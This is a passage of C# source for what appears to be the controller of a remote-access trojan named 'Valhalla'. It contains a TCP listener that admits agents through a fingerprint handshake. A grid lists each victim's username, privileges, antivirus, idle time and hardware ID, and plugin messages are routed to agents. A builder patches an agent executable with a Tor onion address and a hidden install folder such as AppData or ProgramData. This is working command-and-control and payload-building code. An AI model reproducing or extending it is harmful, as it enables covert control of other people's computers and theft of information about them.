                MessageBox.Show($"Unable to listen on port {port}: {ex.Message}",
                    "Server Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            catch (Exception ex)
            {
                isServerRunning = false;
                tcpServer = null;
                LogServerEvent("Port listen failed: " + ex.Message, LogType.Error);
                MessageBox.Show($"Error starting server: {ex.Message}",
                    "Server Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void StopServer()
        {
            try
            {
                serverStopRequested = true;
                isServerRunning = false;

                if (tcpServer != null)
                    tcpServer.Stop();

                List<TcpClient> clients;
                lock (connectionStateLock)
                {
                    clients = connectedClients.Values.ToList();
                    connectedClients.Clear();
                }

                foreach (TcpClient client in clients)
                {
                    try { client.Close(); } catch (Exception) { }
                }

                Thread listenerThread = serverThread;
                if (listenerThread != null && listenerThread.IsAlive && listenerThread != Thread.CurrentThread)
                    listenerThread.Join(1500);

                AppendServerSettingsLog("Port listener stopped", LogType.Success);
            }
            catch (Exception ex)
            {
                LogServerEvent("Port stop failed: " + ex.Message, LogType.Error);
            }
        }
        private void RunServer(int port)
        {
            try
            {
                while (isServerRunning)
                {
                    try
                    {
                        TcpClient client = tcpServer.AcceptTcpClient();
                        if (!isServerRunning)
                        {
                            client.Close();
                            break;
                        }

                        Thread clientThread = new Thread(new ParameterizedThreadStart(HandleClient))
                        {
                            IsBackground = true
                        };
                        clientThread.Start(client);
                    }
                    catch (SocketException)
                    {
                        if (!isServerRunning)
                            break;
                    }
                    catch (ObjectDisposedException)
                    {
                        if (!isServerRunning)
                            break;
                    }
                }
            }
            catch (SocketException ex)
            {
                LogServerEvent("Server error: " + ex.Message, LogType.Error);
            }
            catch (Exception ex)
            {
                LogServerEvent("Server error: " + ex.Message, LogType.Error);
            }
            finally
            {
                isServerRunning = false;

                try
                {
                    if (tcpServer != null)
                        tcpServer.Stop();
                }
                catch (Exception)
                {
                }

                if (!serverStopRequested)
                    AppendServerSettingsLog("Port listener stopped unexpectedly", LogType.Warning);
            }
        }

        private static bool IsHex64(string value)
        {
            return !string.IsNullOrWhiteSpace(value)
                && value.Length == 64
                && value.All(c => (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F'));
        }

        private static void SendProtocolLine(NetworkStream stream, string value)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(value + "\n");
            stream.Write(bytes, 0, bytes.Length);
            stream.Flush();
        }


        private bool IsValidUpdateProbeData(string data, string expectedFingerprint)
        {
            try
            {
                string[] parts = data.Split('|');
                if (parts.Length < 16)
                    return false;

                string payloadFingerprint = BlockedConnectionStore.NormalizeFingerprint(parts[15]);
                if (payloadFingerprint.Length == 0
                    || !string.Equals(payloadFingerprint, expectedFingerprint, StringComparison.OrdinalIgnoreCase))
                    return false;

                // These fields are required to distinguish a real agent telemetry frame
                // from a minimal/malformed probe response.
                if (string.IsNullOrWhiteSpace(parts[1])
                    || string.IsNullOrWhiteSpace(parts[3])
                    || string.IsNullOrWhiteSpace(parts[4]))
                    return false;

                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        private void HandleUpdateProbeConnection(NetworkStream stream, StreamReader reader, string helloLine)
        {
            try
            {
                string payload = helloLine.Substring("HELLO:UPDATE-PROBE:".Length);
                string[] parts = payload.Split(new[] { ':' }, 3);
                if (parts.Length != 3)
                {
                    SendProtocolLine(stream, "ERR:UPDATE_PROBE");
                    return;
                }

                string fingerprint = BlockedConnectionStore.NormalizeFingerprint(parts[0].Trim());
                string token = parts[1].Trim();
                string candidateHash = parts[2].Trim();
                if (!IsHex64(fingerprint) || !IsHex64(token) || !IsHex64(candidateHash))
                {
                    SendProtocolLine(stream, "ERR:UPDATE_PROBE");
                    return;
                }

                if (blockedConnectionStore.Contains(fingerprint))
                {
                    SendProtocolLine(stream, "ERR:UPDATE_PROBE");
                    LogServerEvent("Blocked update candidate rejected: " + fingerprint, LogType.Warning);
                    return;
                }

                PendingUpdateProbe matched = null;
                lock (connectionStateLock)
                {
                    string key = fingerprint + "|" + candidateHash.ToLowerInvariant();
                    PendingUpdateProbe probe;
                    if (pendingUpdateProbes.TryGetValue(key, out probe))
                    {
                        bool connectionStillLive = connectedClients.ContainsKey(probe.ConnectionId);
                        if (probe.ExpiresUtc >= DateTime.UtcNow
                            && connectionStillLive
                            && string.Equals(probe.ExpectedHash, candidateHash, StringComparison.OrdinalIgnoreCase)
                            && string.Equals(probe.ExpectedFingerprint, fingerprint, StringComparison.OrdinalIgnoreCase))
                        {
                            matched = probe;
                        }
                        else if (probe.ExpiresUtc < DateTime.UtcNow || !connectionStillLive)
                        {
                            pendingUpdateProbes.Remove(key);
                        }
                    }
                }

                if (matched == null)
                {
                    SendProtocolLine(stream, "ERR:UPDATE_PROBE");
                    LogServerEvent("Update candidate rejected: no matching pending update", LogType.Warning);
                    return;
                }

                // Require the candidate to behave like a real agent, not merely echo the
                // probe HELLO. The candidate sends DATA immediately after HELLO; validate
                // its telemetry fingerprint/version before admitting the handoff.
                string dataLine = reader.ReadLine();
                if (dataLine == null || !dataLine.StartsWith("DATA:", StringComparison.Ordinal)
                    || !IsValidUpdateProbeData(dataLine.Substring(5), fingerprint))
                {
                    lock (connectionStateLock)
                    {
                        pendingUpdateProbes.Remove(fingerprint + "|" + candidateHash.ToLowerInvariant());
                    }
                    SendProtocolLine(stream, "ERR:UPDATE_PROBE");
                    LogServerEvent("Update candidate rejected: telemetry admission failed", LogType.Warning);
                    return;
                }

                SendProtocolLine(stream, "ACK:UPDATE-PROBE:" + fingerprint + ":" + token);
                lock (connectionStateLock)
                {
                    pendingUpdateProbes.Remove(fingerprint + "|" + candidateHash.ToLowerInvariant());
                }
                LogServerEvent("Update candidate admitted: " + fingerprint + " hash=" + candidateHash, LogType.Success);
            }
            catch (Exception ex)
            {
                try { SendProtocolLine(stream, "ERR:UPDATE_PROBE"); } catch (Exception) { }
                LogServerEvent("Update candidate probe handling failed: " + ex.Message, LogType.Error);
            }
        }

        private void HandleClient(object obj)
        {
            TcpClient tcpClient = (TcpClient)obj;
            string clientIp = "unknown";
            string connectionId = Guid.NewGuid().ToString("N");
            NetworkStream stream = null;
            bool telemetrySeen = false;
            bool remoteDisconnected = false;
            string fingerprint = string.Empty;

            try
            {
                if (tcpClient.Client.RemoteEndPoint is System.Net.IPEndPoint endpoint)
                    clientIp = endpoint.Address.ToString();

                stream = tcpClient.GetStream();
                stream.ReadTimeout = 5000;

                using (var reader = new System.IO.StreamReader(
                    stream, Encoding.UTF8, false, 4096, true))
                {
                    string line = reader.ReadLine();
                    if (line != null && line.StartsWith("HELLO:UPDATE-PROBE:", StringComparison.Ordinal))
                    {
                        HandleUpdateProbeConnection(stream, reader, line);
                        return;
                    }

                    if (line == null || !line.StartsWith("HELLO:FINGERPRINT:", StringComparison.Ordinal))
                    {
                        LogServerEvent("Connection rejected: fingerprint handshake missing", LogType.Warning);
                        return;
                    }

                    fingerprint = BlockedConnectionStore.NormalizeFingerprint(line.Substring("HELLO:FINGERPRINT:".Length));
                    if (fingerprint.Length == 0)
                    {
                        LogServerEvent("Connection rejected: invalid fingerprint", LogType.Error);
                        return;
                    }

                    if (blockedConnectionStore.Contains(fingerprint))
                    {
                        lock (connectionStateLock)
                        {
                            if (blockedConnectionRejectionLogged.Add(fingerprint))
                                LogServerEvent("Blocked connection rejected: " + fingerprint, LogType.Warning);
                        }
                        return;
                    }

                    lock (connectionStateLock)
                    {
                        connectedClients[connectionId] = tcpClient;
                    }

                    stream.ReadTimeout = System.Threading.Timeout.Infinite;
                    line = null;
                    // Do not use TcpClient.Connected here. It is not an authoritative
                    // live-state check; EOF or a socket exception is the actual signal.
                    while (isServerRunning && (line = reader.ReadLine()) != null)
                    {
                        if (line.Length == 0)
                            continue;

                        if (line.StartsWith("DATA:", StringComparison.Ordinal))
                        {
                            if (ParseClientDataAndAddToGrid(connectionId, clientIp, fingerprint, line.Substring(5))
                                && !telemetrySeen)
                            {
                                telemetrySeen = true;
                                LogServerEvent("Client connected: " + clientIp, LogType.Connection);
                            }
                        }
                        else if (string.Equals(line, "HB", StringComparison.Ordinal))
                        {
                            // Heartbeats only prove liveness. They never update grid telemetry.
                        }
                        else if (string.Equals(line, "PONG", StringComparison.Ordinal))
                        {
                            UpdateConnectionPing(connectionId);
                        }
                        else if (line.StartsWith("PLUGIN_OUT:", StringComparison.Ordinal))
                        {
                            string payload = line.Substring("PLUGIN_OUT:".Length);
                            int split = payload.IndexOf(':');
                            if (split > 0)
                            {
                                string eventName = payload.Substring(0, split);
                                byte[] bytes;
                                try { bytes = Convert.FromBase64String(payload.Substring(split + 1)); } catch { bytes = new byte[0]; }
                                pluginManager.RouteAgentMessage(connectionId, eventName, bytes);
                            }
                        }
                        else if (line.StartsWith("ACK:", StringComparison.Ordinal))
                        {
                            string command = line.Substring(4).Trim().ToUpperInvariant();
                            CompletePendingCommand(connectionId, command, true);
                        }
                        else if (line.StartsWith("ERR:", StringComparison.Ordinal))
                        {
                            string command = line.Substring(4).Trim().ToUpperInvariant();
                            CompletePendingCommand(connectionId, command, false);
                        }
                        else
                        {
                            // Silently ignore non-Valhalla traffic. Local probes and
                            // unrelated clients can legitimately reach an open TCP port.
                        }
                    }

                    if (isServerRunning)
                        remoteDisconnected = true; // ReadLine() returned EOF.
                }
            }
            catch (IOException)
            {
                remoteDisconnected = isServerRunning;
            }
            catch (ObjectDisposedException)
            {
                remoteDisconnected = false;
            }
            catch (SocketException)
            {
                remoteDisconnected = isServerRunning;
            }
            catch (Exception ex)
            {
                if (isServerRunning)
                {
                    remoteDisconnected = true;
                    LogServerEvent("Client handling failed: " + ex.Message, LogType.Error);
                }
            }
            finally
            {
                RemoveConnectionRow(connectionId);

                lock (connectionStateLock)
                {
                    connectedClients.Remove(connectionId);
                }

                selectedConnectionIds.Remove(connectionId);
                ReportPendingCommandsOnDisconnect(connectionId);
                lock (connectionStateLock)
                {
                    pendingTelemetryRefreshes.Remove(connectionId);
                    telemetryRequestTicks.Remove(connectionId);
                    List<string> expiredProbeTokens = pendingUpdateProbes
                        .Where(kvp => string.Equals(kvp.Value.ConnectionId, connectionId, StringComparison.Ordinal))
                        .Select(kvp => kvp.Key)
                        .ToList();
                    foreach (string token in expiredProbeTokens)
                        pendingUpdateProbes.Remove(token);
                }

                try
                {
                    if (stream != null)
                        stream.Close();
                }
                catch (Exception)
                {
                }

                try
                {
                    tcpClient.Close();
                }
                catch (Exception)
                {
                }

                if (telemetrySeen && remoteDisconnected && isServerRunning)
                    LogServerEvent("Client disconnected: " + clientIp, LogType.Warning);
            }
        }



        private long lastLoggedPercentage = 0;
        private void LogFileProgress(string clientIp, string fileName, long receivedBytes, long totalBytes)
        {
            if (totalBytes <= 0)
                return;

            int percentage = (int)((receivedBytes * 100) / totalBytes);

            // Only log at 10% intervals or completion
            if (percentage == 100 || percentage - lastLoggedPercentage >= 10)
            {
                lastLoggedPercentage = percentage;
                LogToMonitor($"File transfer progress from {clientIp}: {percentage}% ({FormatFileSize(receivedBytes)} of {FormatFileSize(totalBytes)})", LogType.DataTransfer);
            }

            // Reset last logged percentage when file transfer completes
            if (percentage == 100)
                lastLoggedPercentage = 0;
        }

        private string FormatFileSize(long bytes)
        {
            string[] sizes = { "B", "KB", "MB", "GB", "TB" };
            double len = bytes;
            int order = 0;
            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len = len / 1024;
            }
            return String.Format("{0:0.##} {1}", len, sizes[order]);
        }



        private void UpdateConnectionPing(string connectionId)
        {
            long startTicks;
            lock (connectionStateLock)
            {
                if (!telemetryRequestTicks.TryGetValue(connectionId, out startTicks))
                    return;

                telemetryRequestTicks.Remove(connectionId);
            }

            long elapsedTicks = Stopwatch.GetTimestamp() - startTicks;
            long pingMs = Math.Max(0L, (long)Math.Round(
                elapsedTicks * 1000.0 / Stopwatch.Frequency));

            if (InvokeRequired)
            {
                Invoke(new Action(() => UpdateConnectionPingValue(connectionId, pingMs)));
                return;
            }

            UpdateConnectionPingValue(connectionId, pingMs);
        }

        private void UpdateConnectionPingValue(string connectionId, long pingMs)
        {
            foreach (DataRow row in clientsTable.Rows)
            {
                if (string.Equals(Convert.ToString(row["ConnectionId"]), connectionId, StringComparison.Ordinal))
                {
                    row["Ping"] = pingMs.ToString() + " ms";
                    return;
                }
            }
        }

        private void UpsertConnectionRow(
            string connectionId,
            string clientIp,
            string country,
            string nickname,
            string tag,
            string userName,
            string version,
            string privileges,
            string osName,
            string gpu,
            string cpu,
            string ram,
            string antivirus,
            string uptime,
            string afkTime,
            string ping,
            string hwid,
            string fingerprint)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => UpsertConnectionRow(
                    connectionId, clientIp, country, nickname, tag, userName, version,
                    privileges, osName, gpu, cpu, ram, antivirus, uptime, afkTime, ping, hwid, fingerprint)));
                return;
            }

            DataRow row = null;
            foreach (DataRow candidate in clientsTable.Rows)
            {
                if (string.Equals(Convert.ToString(candidate["ConnectionId"]), connectionId, StringComparison.Ordinal))
                {
                    row = candidate;
                    break;
                }
            }

            bool isNewRow = row == null;
            bool refreshDynamicTelemetry = false;

            if (isNewRow)
            {
                row = clientsTable.NewRow();
                row["ConnectionId"] = connectionId;
                clientsTable.Rows.Add(row);
                refreshDynamicTelemetry = true;
            }
            else
            {
                lock (connectionStateLock)
                {
                    refreshDynamicTelemetry = pendingTelemetryRefreshes.Remove(connectionId);
                }
            }

            if (isNewRow)
            {
                // Identity/configuration is static for the lifetime of this TCP session.
                row["IP"] = clientIp;
                row["Country"] = country;
                row["Nickname"] = nickname;
                row["Tag"] = tag;
                row["UserName"] = userName;
                row["Version"] = version;
                row["Privileges"] = privileges;
                row["OS"] = osName;
                row["GPU"] = gpu;
                row["CPU"] = cpu;
                row["AntiVirus"] = antivirus;
                row["HWID"] = hwid;
                row["Fingerprint"] = fingerprint;

                // A notification represents a new identified connection, not every
                // telemetry refresh for an existing connection.
                // userName is the Windows login name (GetUserNameW); nickname is the computer name.
                HandleNewConnectionNotification(userName, tag, clientIp, country);
            }

            if (refreshDynamicTelemetry)
            {
                // Only changing fields are refreshed on selection.
                row["RAM"] = ram;
                row["Uptime"] = uptime;
                row["AFKTime"] = afkTime;
                if (!string.IsNullOrWhiteSpace(ping) &&
                    !string.Equals(ping, "Unknown", StringComparison.OrdinalIgnoreCase))
                {
                    row["Ping"] = ping;
                }
            }

        }

        private void RemoveConnectionRow(string connectionId)
        {
            if (InvokeRequired)
            {
                BeginInvoke(new Action(() => RemoveConnectionRow(connectionId)));
                return;
            }

            DataRow remove = null;
            foreach (DataRow row in clientsTable.Rows)
            {
                if (string.Equals(Convert.ToString(row["ConnectionId"]), connectionId, StringComparison.Ordinal))
                {
                    remove = row;
                    break;
                }
            }

            if (remove != null)
                clientsTable.Rows.Remove(remove);

            connectionRowIds.Remove(connectionId);
            selectedConnectionIds.Remove(connectionId);
            lock (connectionStateLock)
            {
                pendingTelemetryRefreshes.Remove(connectionId);
                telemetryRequestTicks.Remove(connectionId);
            }
            UpdateClientCount();
        }

        private bool ParseClientDataAndAddToGrid(string connectionId, string clientIp, string fingerprint, string data)
        {
            try
            {
                string[] parts = data.Split('|');
                if (parts.Length < 16)
                {
                    LogServerEvent("Telemetry rejected: incomplete payload", LogType.Warning);
                    return false;
                }

                string country = parts[0];
                string nickname = parts[1];
                string tag = parts[2];
                string userName = parts[3];
                string version = parts[4];
                string privileges = parts[5];
                string osName = parts[6];
                string gpu = parts[7];
                string cpu = parts[8];
                string ram = parts[9];
                string antivirus = parts[10];
                string uptime = parts[11];
                string afkTime = parts[12];
                string ping = parts[13];
                string hwid = parts[14];
                string payloadFingerprint = BlockedConnectionStore.NormalizeFingerprint(parts[15]);
                string handshakeFingerprint = BlockedConnectionStore.NormalizeFingerprint(fingerprint);
                if (payloadFingerprint.Length == 0 || !string.Equals(payloadFingerprint, handshakeFingerprint, StringComparison.OrdinalIgnoreCase))
                {
                    LogServerEvent("Telemetry rejected: fingerprint mismatch", LogType.Error);
                    return false;
                }

                UpsertConnectionRow(
                    connectionId, clientIp,
                    string.IsNullOrWhiteSpace(country) ? "Unknown" : country,
                    string.IsNullOrWhiteSpace(nickname) ? "Unknown" : nickname,
                    string.IsNullOrWhiteSpace(tag) ? "Unknown" : tag,
                    string.IsNullOrWhiteSpace(userName) ? "Unknown" : userName,
                    string.IsNullOrWhiteSpace(version) ? "Unknown" : version,
                    string.IsNullOrWhiteSpace(privileges) ? "Unknown" : privileges,
                    string.IsNullOrWhiteSpace(osName) ? "Unknown" : osName,
                    string.IsNullOrWhiteSpace(gpu) ? "Unknown" : gpu,
                    string.IsNullOrWhiteSpace(cpu) ? "Unknown" : cpu,
                    string.IsNullOrWhiteSpace(ram) ? "Unknown" : ram,
                    string.IsNullOrWhiteSpace(antivirus) ? "Unknown" : antivirus,
                    string.IsNullOrWhiteSpace(uptime) ? "Unknown" : uptime,
                    string.IsNullOrWhiteSpace(afkTime) ? "Unknown" : afkTime,
                    string.IsNullOrWhiteSpace(ping) ? "Unknown" : ping,
                    string.IsNullOrWhiteSpace(hwid) ? "Unknown" : hwid,
                    payloadFingerprint);

                UpdateClientCount();
                return true;
            }
            catch (Exception ex)
            {
                LogServerEvent("Telemetry parsing failed: " + ex.Message, LogType.Error);
                return false;
            }
        }
        private void UpdateClientCount()
        {
            // Ensure we run on the UI thread
            if (InvokeRequired)
            {
                Invoke(new Action(UpdateClientCount));
                return;
            }

            // Update the client count display
            label2.Text = clientsTable.Rows.Count.ToString();
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            // Stop server when form is closing
            isServerRunning = false;
            if (tcpServer != null)
            {
                tcpServer.Stop();
            }

            base.OnFormClosing(e);
        }

        #endregion

      
        private void panelControl4_Paint(object sender, PaintEventArgs e)
        {

        }

        private void simpleButton3_Click(object sender, EventArgs e)
        {
          
        }
        private void UpdatePortsLabel()
        {
           
        }
        private void simpleButton1_Click(object sender, EventArgs e)
        {
            if (isServerRunning)
            {
                MessageBox.Show("Server is already running!");
                return;
            }
            try
            {
                // Get port from textEdit1
                if (!int.TryParse(textEdit1.Text, out int port))
                {
                    MessageBox.Show("Please enter a valid port number!");
                    return;
                }
                // Validate port number
                if (port < 1 || port > 65535)
                {
                    MessageBox.Show("Port must be between 1 and 65535!");
                    return;
                }

                // Clear log before starting server
                richTextBox1.Clear();
                AppendServerSettingsLog("Starting listener on port " + port, LogType.Info);

                // Start server with the specified port
                StartServer(port);
                label45.Text = port.ToString();

                MessageBox.Show("Your server is running on port " + port.ToString(),
                "Server Information",
                MessageBoxButtons.OK,
                MessageBoxIcon.Information);

                // Update UI
                simpleButton1.Enabled = false;
                simpleButton2.Enabled = true;
                textEdit1.Enabled = false;
            }
            catch (Exception ex)
            {
                LogServerEvent("Port listen failed: " + ex.Message, LogType.Error);
                MessageBox.Show("Error starting server: " + ex.Message);
            }
        }

        private void simpleButton2_Click(object sender, EventArgs e)
        {
            // Stop listening
    if (!isServerRunning)
    {
        MessageBox.Show("Server is not running!");
        return;
    }
    
    try
    {
        AppendServerSettingsLog("Stopping port listener", LogType.Info);
        StopServer();
              

        // Update UI
        simpleButton1.Enabled = true;
        simpleButton2.Enabled = false;
        textEdit1.Enabled = true;
        
                label45.Text = "0";
            }
    catch (Exception ex)
    {
        LogServerEvent("Port stop failed: " + ex.Message, LogType.Error);
        MessageBox.Show("Error stopping server: " + ex.Message);
    }
        }

        private void panelControl13_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panelControl23_Paint(object sender, PaintEventArgs e)
        {

        }

        private void ConfigureAgentBuildUi()
        {
            OpenFileDialogIcon = string.Empty;

            // Rename the builder page header label from legacy "Build Payload (.exe)" to current purpose.
            label52.Text = "Build Agent";

            // Rename the sidebar navigation item to reflect current purpose.
            accordionControlElement6.Text = "Build";

            // Hide the legacy "Convert To (.dll)" sidebar entry and its tab page.
            accordionControlElement7.Visible = false;
            xtraTabPage6.PageVisible        = false;

            // Remove the About category and About Us page from the sidebar and tab strip.
            accordionControlElement12.Visible = false;
            accordionControlElement13.Visible = false;
            xtraTabPage9.PageVisible          = false;

            // ── Strip the dead space from panelControl19 ────────────────────
            // The designer placed 5 legacy controls (checkEdit1-4, textEdit5) with
            // DockStyle.Top — they consume ~100px even when invisible.  Remove them
            // from the dock chain entirely so they produce no layout space.
            foreach (var c in new System.Windows.Forms.Control[]
                { checkEdit1, checkEdit2, checkEdit3, checkEdit4, textEdit5, label53, textEdit3 })
            {
                c.Dock    = DockStyle.None;
                c.Visible = false;
                c.Size    = Size.Empty;
            }

            // Also undock label54 / textEdit4 / simpleButton6 so we can
            // position everything ourselves without competing dock stacks.
            label54.Dock     = DockStyle.None;
            textEdit4.Dock   = DockStyle.None;
            simpleButton6.Dock = DockStyle.None;

            // ── Restore persisted values ────────────────────────────────────
            if (relaySettings != null)
            {
                _selectedInstallDir = relaySettings.InstallDirectory;
                if (_selectedInstallDir < 0 || _selectedInstallDir > 4) _selectedInstallDir = 1;
            }

            // ── Build the content panel that replaces panelControl19's interior ─
            // Layout (top → bottom, left-indented by pictureEdit13 = 50px):
            //   16px  "Onion Address" label
            //   26px  textEdit4 (onion address field)
            //   18px  gap
            //   16px  "Install Directory" label   |  "Folder Name" label
            //   30px  toggle buttons row          |  folder textbox
            //   18px  gap
            //   32px  BUILD button
            // Total ≈ 156px  →  panelControl19 shrunk to 160px (+ 2px border padding each side)

            const int leftPad  = 52;   // width of pictureEdit13 + panel border
            const int rightPad = 4;
            const int rowH     = 26;
            const int btnH     = 32;
            const int labelH   = 16;
            const int gap      = 12;

            // Configure existing onion address label + field
            label54.Text      = "Onion Address";
            label54.AutoSize  = true;
            label54.Font      = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point);
            label54.ForeColor = Color.FromArgb(160, 160, 160);
            label54.BackColor = Color.Transparent;

            textEdit4.Properties.AllowFocused = true;
            textEdit4.EditValue = relaySettings != null && !string.IsNullOrWhiteSpace(relaySettings.OnionAddress)
                ? relaySettings.OnionAddress
                : string.Empty;

            // Configure existing BUILD button
            simpleButton6.Dock = DockStyle.None;
            simpleButton6.Height = btnH;

            // ── Install Directory label + toggles ───────────────────────────
            var installDirLabel = new System.Windows.Forms.Label
            {
                AutoSize  = true,
                Text      = "Install Directory",
                Font      = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point),
                ForeColor = Color.FromArgb(160, 160, 160),
                BackColor = Color.Transparent,
            };

            string[] dirNames = { @"AppData\Roaming", @"AppData\Local", "Temp", "Program Files", "ProgramData" };
            _installDirButtons = new System.Windows.Forms.Button[dirNames.Length];

            var toggleRow = new System.Windows.Forms.FlowLayoutPanel
            {
                AutoSize      = true,
                FlowDirection = System.Windows.Forms.FlowDirection.LeftToRight,
                WrapContents  = false,
                BackColor     = Color.Transparent,
                Margin        = Padding.Empty,
                Padding       = Padding.Empty,
            };

            for (int i = 0; i < dirNames.Length; i++)
            {
                int capturedIndex = i;
                var btn = new System.Windows.Forms.Button
                {
                    Text      = dirNames[i],
                    AutoSize  = false,
                    Height    = 28,
                    Width     = 108,
                    FlatStyle = FlatStyle.Flat,
                    Cursor    = Cursors.Hand,
                    Font      = new Font("Segoe UI Semibold", 8F, FontStyle.Bold, GraphicsUnit.Point),
                    Margin    = new Padding(0, 0, 6, 0),
                    UseVisualStyleBackColor = false,
                };
                btn.FlatAppearance.BorderSize  = 1;
                btn.FlatAppearance.BorderColor = Color.FromArgb(68, 68, 68);
                UpdateInstallDirButtonStyle(btn, i == _selectedInstallDir);
                btn.Click += (s, e) =>
                {
                    _selectedInstallDir = capturedIndex;
                    for (int j = 0; j < _installDirButtons.Length; j++)
                        UpdateInstallDirButtonStyle(_installDirButtons[j], j == _selectedInstallDir);
                    if (relaySettings != null)
                    {
                        relaySettings.InstallDirectory = _selectedInstallDir;
                        try { RelaySettingsStore.Save(relaySettings); } catch { }
                    }
                };
                _installDirButtons[i] = btn;
                toggleRow.Controls.Add(btn);
            }

            // ── Folder Name label + textbox ──────────────────────────────────
            var folderLabel = new System.Windows.Forms.Label
            {
                AutoSize  = true,
                Text      = "Folder Name",
                Font      = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point),
                ForeColor = Color.FromArgb(160, 160, 160),
                BackColor = Color.Transparent,
            };

            _folderNameBox = new System.Windows.Forms.TextBox
            {
                Width       = 200,
                Height      = 28,
                Text        = relaySettings != null && !string.IsNullOrWhiteSpace(relaySettings.FolderName)
                                  ? relaySettings.FolderName
                                  : "Valhalla",
                Font        = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point),
                ForeColor   = Color.White,
                BackColor   = Color.FromArgb(58, 58, 58),
                BorderStyle = BorderStyle.FixedSingle,
            };
            _folderNameBox.TextChanged += (s, e) =>
            {
                if (relaySettings != null)
                {
                    relaySettings.FolderName = _folderNameBox.Text;
                    try { RelaySettingsStore.Save(relaySettings); } catch { }
                }
            };

            // ── Lay everything out with explicit coordinates ─────────────────
            // We use a single transparent host panel that fills panelControl19
            // to the right of pictureEdit13, so we own the coordinate space.
            var host = new System.Windows.Forms.Panel
            {
                BackColor = Color.Transparent,
                Dock      = DockStyle.Fill,
            };

            // Row positions
            int y = 10;

            label54.Location  = new Point(0, y);
            y += labelH + 4;
            textEdit4.Location = new Point(0, y);
            textEdit4.Height   = rowH;
            y += rowH + gap;

            installDirLabel.Location = new Point(0, y);
            // Folder Name label aligned to same row
            folderLabel.Location     = new Point(host.Width > 0 ? host.Width - 210 : 820, y);
            y += labelH + 4;

            toggleRow.Location    = new Point(0, y);
            _folderNameBox.Location = new Point(host.Width > 0 ? host.Width - 210 : 820, y);
            _folderNameBox.Height   = 28;
            y += 30 + gap;

            simpleButton6.Location = new Point(0, y);
            int totalH = y + btnH + 10;

            host.Controls.Add(label54);
            host.Controls.Add(textEdit4);
            host.Controls.Add(installDirLabel);
            host.Controls.Add(folderLabel);
            host.Controls.Add(toggleRow);
            host.Controls.Add(_folderNameBox);
            host.Controls.Add(simpleButton6);

            // Reposition folderLabel and _folderNameBox when host resizes
            host.Resize += (s, e) =>
            {
                int rightX = host.Width - _folderNameBox.Width - 4;
                folderLabel.Left     = rightX;
                _folderNameBox.Left  = rightX;
                textEdit4.Width      = host.Width - 4;
                simpleButton6.Width  = host.Width - 4;
                toggleRow.Width      = rightX - 8;
            };

            // Shrink panelControl19 to eliminate the dead space from hidden controls.
            // Original: 224px. We need: padding(2) + totalH + padding(2).
            panelControl19.Height = totalH + 4;

            // Remove all existing children from panelControl19 except pictureEdit13,
            // then add our host panel which fills the remaining space.
            var keepControls = new System.Windows.Forms.Control[] { pictureEdit13 };
            for (int i = panelControl19.Controls.Count - 1; i >= 0; i--)
            {
                if (Array.IndexOf(keepControls, panelControl19.Controls[i]) < 0)
                    panelControl19.Controls.RemoveAt(i);
            }

            // pictureEdit13 is DockStyle.Left — host fills the rest
            panelControl19.Controls.Add(host);
        }

        private static void UpdateInstallDirButtonStyle(System.Windows.Forms.Button btn, bool selected)
        {
            btn.BackColor = selected ? UiTheme.AccentColor          : Color.FromArgb(58, 58, 58);
            btn.ForeColor = selected ? Color.Black                   : Color.FromArgb(160, 160, 160);
            btn.FlatAppearance.BorderColor = selected ? UiTheme.AccentColor : Color.FromArgb(68, 68, 68);
        }

        private void ApplyValhallaApplicationIcon()
        {
            string iconPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "valknut.ico");
            if (!File.Exists(iconPath)) return;
            try
            {
                using (Icon source = new Icon(iconPath))
                    this.Icon = (Icon)source.Clone();
            }
            catch (Exception ex)
            {
                LogServerEvent("Valhalla application icon could not be loaded: " + ex.Message, LogType.Warning);
            }
        }

        public class RandomStringGenerator
        {
            private static readonly char[] chars =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray();

            public static string Generate(int length)
            {
                var random = new Random();
                var result = new StringBuilder(length);
                for (int i = 0; i < length; i++)
                {
                    result.Append(chars[random.Next(chars.Length)]);
                }
                return result.ToString();
            }
        }
        public  string output = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + RandomStringGenerator.Generate(16) + ".bin";
        private string OpenFileDialogIcon = string.Empty;
        string storedLink = string.Empty;
        private async void simpleButton6_Click(object sender, EventArgs e)
        {
            string onion = (textEdit4.Text ?? string.Empty).Trim();
            try
            {
                AgentBuildService.ValidateOnionAddress(onion);
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, ex.Message, "Valhalla Agent Build", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            int    installDir  = _selectedInstallDir;
            string folderName  = (_folderNameBox != null ? _folderNameBox.Text : null) ?? "Valhalla";
            if (string.IsNullOrWhiteSpace(folderName)) folderName = "Valhalla";

            // Show a Save File dialog so the operator chooses the output name and location.
            string outputPath;
            using (var sfd = new System.Windows.Forms.SaveFileDialog
            {
                Title            = "Save Valhalla Agent",
                Filter           = "Executable (*.exe)|*.exe",
                DefaultExt       = "exe",
                FileName         = "agent.exe",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            })
            {
                if (sfd.ShowDialog(this) != System.Windows.Forms.DialogResult.OK)
                    return;
                outputPath = sfd.FileName;
            }

            simpleButton6.Enabled = false;
            richTextBox2.Clear();

            try
            {
                await Task.Run(() => AgentBuildService.PatchAndDeploy(onion, installDir, folderName, outputPath));

                if (relaySettings == null) relaySettings = RelaySettingsStore.Load();
                relaySettings.OnionAddress    = onion;
                relaySettings.InstallDirectory = installDir;
                relaySettings.FolderName       = folderName;
                RelaySettingsStore.Save(relaySettings);

